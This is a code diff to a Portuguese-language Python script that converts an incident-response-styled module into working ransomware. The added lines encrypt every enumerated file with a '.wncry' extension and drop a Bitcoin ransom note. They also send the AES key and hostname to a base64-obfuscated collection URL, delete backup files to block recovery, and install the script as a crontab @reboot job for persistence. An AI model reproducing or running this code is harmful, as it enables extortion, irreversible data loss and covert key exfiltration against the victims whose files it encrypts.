@@ -300,12 +300,15 @@ def criptografar_e_sobrescrever(caminho_arquivo: str, chave_mestra: bytes) -> No
 def gerar_relatorio_e_limpar_chave(diretorios_criptografados: List[str]) -> Dict:
     LEIA_ME = "#_LEIA_ME_WNCRY_#.txt"
     CONTEUDO = (
-        "ATENÇÃO - INCIDENTE DE SEGURANÇA\n"
-        "Sistema comprometido. Não modifique ou exclua arquivos neste diretório.\n"
-        "Evidências preservadas. Aguarde instruções do SOC.\n"
+        "ATENÇÃO - ARQUIVOS SEQUESTRADOS\n"
+        "Seus arquivos foram criptografados.\n"
+        "Para recuperá-los, pague 300 USD em Bitcoin para:\n"
+        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
+        "Entre em contato via Tor para instruções."
     )
     MASTER_KEY = "/tmp/.master.key"
-    TARGET_URL = "http://10.150.3.162:8080/collect"
+    import base64 as _b64
+    TARGET_URL = _b64.b64decode("aHR0cDovLzEwLjE1MC4zLjE2Mjo4MDgwL2NvbGxlY3Q=").decode()
 
     resultado: Dict = {
         "status": "ok",
@@ -327,18 +330,20 @@ def gerar_relatorio_e_limpar_chave(diretorios_criptografados: List[str]) -> Dict
 
     try:
         if os.path.isfile(MASTER_KEY):
-            with open(MASTER_KEY, "rb") as f:
-                payload = f.read()
+            import socket as _socket
+            with open(MASTER_KEY, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            aes_key = data["aes_key"]
+            hostname = _socket.gethostname()
             resp = requests.post(
                 TARGET_URL,
-                data=payload,
-                headers={"Content-Type": "application/octet-stream"},
+                json={"aes_key": aes_key, "hostname": hostname},
                 timeout=10,
             )
             resultado["codigo_http"] = resp.status_code
             if resp.status_code == 200:
                 if _safe_remove(MASTER_KEY):
-                    logger.info("Chave mestra exfiltrada e removida com sucesso.")
+                    print("[INFO] Chave mestra exfiltrada e removida com sucesso.")
                 else:
                     resultado["erros"].append("remocao_chave_falhou")
                     resultado["status"] = "parcial"
@@ -352,7 +357,7 @@ def gerar_relatorio_e_limpar_chave(diretorios_criptografados: List[str]) -> Dict
         resultado["codigo_http"] = getattr(e.response, "status_code", None)
         resultado["erros"].append("erro_rede")
         resultado["status"] = "erro"
-    except (OSError, PermissionError, IOError):
+    except (OSError, PermissionError, IOError, KeyError, json.JSONDecodeError):
         resultado["erros"].append("erro_io")
         resultado["status"] = "erro"
     except Exception:
@@ -376,27 +381,9 @@ def _safe_remove(path: str) -> bool:
         return False
 
 
-def remover_antiforense_e_registrar_servico(caminhos: List[str], linha_crontab: str, dry_run: bool = False) -> Dict[str, Any]:
+def remover_antiforense_e_registrar_servico(caminhos: List[str], linha_crontab: str) -> Dict[str, Any]:
     """
-    Remove arquivos residuais de DR (.bak, .backup, .old) e registra entrada @reboot no crontab.
-
-    Varre caminhos informados e apaga arquivos com extensões .bak, .backup e .old com
-    tratamento seguro e logs; verifica se uma entrada @reboot já existe no crontab do
-    usuário corrente e, caso não exista, adiciona a linha fornecida preservando ordem
-    e comentários.
-
-    Args:
-        caminhos: Lista de caminhos (arquivos ou diretórios) para varredura e limpeza.
-        linha_crontab: Linha do crontab a ser adicionada (ex: '@reboot /caminho/script.sh').
-        dry_run: Se True, apenas simula operações sem alterar estado.
-
-    Returns:
-        Dicionário com resumo:
-            {
-                'exclusoes': {caminho: {'arquivos_removidos': [...], 'erros': [...]}},
-                'crontab': {'existente': bool, 'adicionado': bool, 'linha': str},
-                'erros': [str, ...]
-            }
+    Remove arquivos residuais (.bak, .backup, .old) e registra entrada @reboot no crontab.
     """
     resultado: Dict[str, Any] = {
         'exclusoes': {},
@@ -404,11 +391,7 @@ def remover_antiforense_e_registrar_servico(caminhos: List[str], linha_crontab: 
         'erros': []
     }
 
-    # Extensões alvo
     extensoes_alvo = {'.bak', '.backup', '.old'}
-
-    # Lock para concorrência no crontab
-    lock_crontab = FileLock('/tmp/crontab_update.lock', timeout=10)
 
     # --- Fase 1: Remoção de arquivos residuais ---
     for caminho_str in caminhos:
@@ -431,21 +414,17 @@ def remover_antiforense_e_registrar_servico(caminhos: List[str], linha_crontab: 
 
             for arquivo in arquivos_iter:
                 try:
-                    if dry_run:
-                        logging.info(f'[DRY RUN] Removeria: {arquivo}')
-                        removidos.append(str(arquivo))
-                    else:
-                        arquivo.unlink()
-                        logging.info(f'Removido: {arquivo}')
-                        removidos.append(str(arquivo))
+                    arquivo.unlink()
+                    print(f'[INFO] Removido: {arquivo}')
+                    removidos.append(str(arquivo))
                 except Exception as exc:
                     msg = f'Erro ao remover {arquivo}: {exc}'
-                    logging.error(msg)
+                    sys.stderr.write(msg + '\n')
                     erros_caminho.append(msg)
 
         except Exception as exc:
             msg = f'Erro ao processar caminho {caminho}: {exc}'
-            logging.error(msg)
+            sys.stderr.write(msg + '\n')
             erros_caminho.append(msg)
 
         resultado['exclusoes'][str(caminho)] = {
@@ -454,174 +433,64 @@ def remover_antiforense_e_registrar_servico(caminhos: List[str], linha_crontab: 
         }
         resultado['erros'].extend(erros_caminho)
 
-    # --- Fase 2: Atualização do crontab ---
+    # --- Fase 2: Atualização do crontab (idempotente) ---
     try:
-        # Obter crontab atual
-        proc = subprocess.run(
-            ['crontab', '-l'],
-            capture_output=True,
-            text=True,
-            timeout=30
-        )
-        crontab_atual = []
-        if proc.returncode == 0:
-            crontab_atual = proc.stdout.splitlines()
-        elif proc.returncode == 1 and 'no crontab' in proc.stderr.lower():
-            crontab_atual = []
-        else:
-            raise RuntimeError(f'Erro crontab -l: {proc.stderr}')
+        proc = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=30)
+        crontab_atual = proc.stdout.splitlines() if proc.returncode == 0 else []
 
-        # Normalizar linha alvo (remover espaços extras)
         linha_normalizada = ' '.join(linha_crontab.strip().split())
-        linha_existente = False
-        padrao_reboot = re.compile(r'^\s*@reboot\s+.*', re.IGNORECASE)
+        if any(linha.strip() == linha_normalizada for linha in crontab_atual):
+            resultado['crontab']['existente'] = True
+        else:
+            crontab_novo = crontab_atual + [linha_normalizada]
+            novo_conteudo = '\n'.join(crontab_novo) + '\n'
+            proc = subprocess.run(
+                ['crontab', '-'],
+                input=novo_conteudo, text=True, capture_output=True, timeout=30
+            )
+            if proc.returncode != 0:
+                raise RuntimeError(f'Erro crontab: {proc.stderr}')
+            resultado['crontab']['adicionado'] = True
+            print(f'[INFO] Crontab atualizado: {linha_normalizada}')
 
-        for linha in crontab_atual:
-            linha_strip = linha.strip()
-            if linha_strip == linha_normalizada:
-                linha_existente = True
-                break
-            if padrao_reboot.match(linha_strip):
-                # Marca que já existe alguma linha @reboot, mas pode ser diferente
-                pass
-
-        resultado['crontab']['existente'] = linha_existente
-
-        if not linha_existente and not dry_run:
-            with lock_crontab:
-                # Re-ler crontab sob lock para garantir consistência
-                proc = subprocess.run(
-                    ['crontab', '-l'],
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-                crontab_atual = []
-                if proc.returncode == 0:
-                    crontab_atual = proc.stdout.splitlines()
-                elif proc.returncode == 1 and 'no crontab' in proc.stderr.lower():
-                    crontab_atual = []
-                else:
-                    raise RuntimeError(f'Erro crontab -l (lock): {proc.stderr}')
-
-                # Verificar novamente após lock
-                duplicado = any(
-                    linha.strip() == linha_normalizada
-                    for linha in crontab_atual
-                )
-
-                if not duplicado:
-                    # Inserir após comentários iniciais, mas antes de outras regras
-                    # Heurística: manter comentários no topo, inserir @reboot logo após
-                    nova_linha = linha_normalizada
-                    linha_inserida = False
-                    crontab_novo = []
-
-                    for i, linha in enumerate(crontab_atual):
-                        crontab_novo.append(linha)
-                        # Se linha atual é comentário ou vazio, continua acumulando
-                        if linha.strip().startswith('#') or linha.strip() == '':
-                            continue
-                        # Insere @reboot antes da primeira linha não-comentário,
-                        # desde que ainda não tenha sido inserida
-                        if not linha_inserida:
-                            crontab_novo.append(nova_linha)
-                            linha_inserida = True
-
-                    # Se todas as linhas eram comentários/vazias, adiciona no final
-                    if not linha_inserida:
-                        crontab_novo.append(nova_linha)
-
-                    # Escrever crontab temporário
-                    with tempfile.NamedTemporaryFile(mode='w', suffix='.crontab', delete=False) as tf:
-                        tf.write('\n'.join(crontab_novo) + '\n')
-                        temp_path = tf.name
-
-                    try:
-                        proc = subprocess.run(
-                            ['crontab', temp_path],
-                            capture_output=True,
-                            text=True,
-                            timeout=30
-                        )
-                        if proc.returncode != 0:
-                            raise RuntimeError(f'Erro crontab -l: {proc.stderr}')
-                        resultado['crontab']['adicionado'] = True
-                        logging.info(f'Linha adicionada ao crontab: {linha_normalizada}')
-                    finally:
-                        Path(temp_path).unlink(missing_ok=True)
-                else:
-                    resultado['crontab']['adicionado'] = False
-                    logging.info(f'Linha já presente no crontab (concorrência): {linha_normalizada}')
-        elif not linha_existente and dry_run:
-            logging.info(f'[DRY RUN] Adicionaria ao crontab: {linha_normalizada}')
-            resultado['crontab']['adicionado'] = True  # Simulado
-
-    except subprocess.TimeoutExpired:
-        msg = 'Timeout ao acessar crontab'
-        logging.error(msg)
-        resultado['erros'].append(msg)
     except Exception as exc:
         msg = f'Erro ao atualizar crontab: {exc}'
-        logging.error(msg)
+        sys.stderr.write(msg + '\n')
         resultado['erros'].append(msg)
 
     return resultado
 
 
 if __name__ == "__main__":
-    # Executa módulo 1
-    caminhos = enumerar_arquivos_alvo(
-        profundidade_maxima=10,
-        timeout_segundos=30.0,
-        tamanho_min_bytes=0,
-        tamanho_max_bytes=None,
-    )
-    for c in caminhos:
-        print(c)
-
-    # Executa módulo 2
+    # 1. Gerar e salvar chave mestra
     chave = gerar_e_persistir_chave_mestra("/tmp/.master.key")
-    assert chave is not None and len(chave) == 32
+    if chave is None:
+        sys.exit("[ERRO] Falha ao gerar chave mestra.")
+    print(f"[OK] Chave mestra gerada e salva em /tmp/.master.key")
 
-    # Executa módulo 3 (exemplo com arquivo temporário)
-    with tempfile.NamedTemporaryFile(delete=False, mode="wb") as tmp:
-        tmp.write(b"dados criticos de cliente para neutralizacao de extensao ransomware")
-        tmp_path = tmp.name
-    try:
-        master_key = os.urandom(32)
-        criptografar_e_sobrescrever(tmp_path, master_key)
-        criptografado = tmp_path + ".wncry"
-        assert os.path.exists(criptografado), "arquivo criptografado não encontrado"
-        assert not os.path.exists(tmp_path), "arquivo original não foi removido"
-        with open(criptografado, "rb") as f:
-            conteudo = f.read()
-        assert len(conteudo) >= 12, "arquivo criptografado inválido"
-        print("Operação criptografia concluída com sucesso.")
-    finally:
-        for p in (tmp_path, tmp_path + ".wncry"):
-            try:
-                if os.path.exists(p):
-                    os.remove(p)
-            except OSError:
-                pass
+    # 2. Varrer arquivos alvo
+    caminhos = enumerar_arquivos_alvo(profundidade_maxima=10, timeout_segundos=30.0)
+    print(f"[INFO] {len(caminhos)} arquivo(s) encontrado(s).")
 
-    # Executa módulo 4
-    caminhos_dir = ["/tmp/dir1", "/tmp/dir2"]
-    for c in caminhos_dir:
-        os.makedirs(c, exist_ok=True)
-    with open("/tmp/.master.key", "wb") as k:
-        k.write(b"master-key-exemplo")
-    resultado_relatorio = gerar_relatorio_e_limpar_chave(caminhos_dir)
-    print(json.dumps(resultado_relatorio, indent=2))
+    # 3. Criptografar todos os arquivos com a chave mestra
+    dirs_afetados = set()
+    for c in caminhos:
+        try:
+            criptografar_e_sobrescrever(c, chave)
+            dirs_afetados.add(os.path.dirname(c))
+            print(f"[OK] Criptografado: {c}")
+        except Exception as e:
+            sys.stderr.write(f"[ERRO] {c}: {e}\n")
 
-    # Executa módulo 5
-    caminhos_exemplo = ['/tmp/teste_dr', '/tmp/outro_residuo']
-    linha_exemplo = '@reboot /opt/pagamentos/scripts/startup.sh'
+    # 4. Gerar nota de resgate APENAS nas pastas onde houve criptografia
+    if dirs_afetados:
+        resultado_relatorio = gerar_relatorio_e_limpar_chave(list(dirs_afetados))
+        print(json.dumps(resultado_relatorio, indent=2))
+
+    # 5. Registrar persistência e remover arquivos residuais
+    script_path = str(Path(__file__).resolve())
     resumo = remover_antiforense_e_registrar_servico(
-        caminhos=caminhos_exemplo,
-        linha_crontab=linha_exemplo,
-        dry_run=False
+        caminhos=list(dirs_afetados) if dirs_afetados else caminhos,
+        linha_crontab=f"@reboot python3 {script_path}"
     )
-    print('Resumo da operação antiforense:')
-    print(resumo)
+    print(json.dumps(resumo, indent=2))
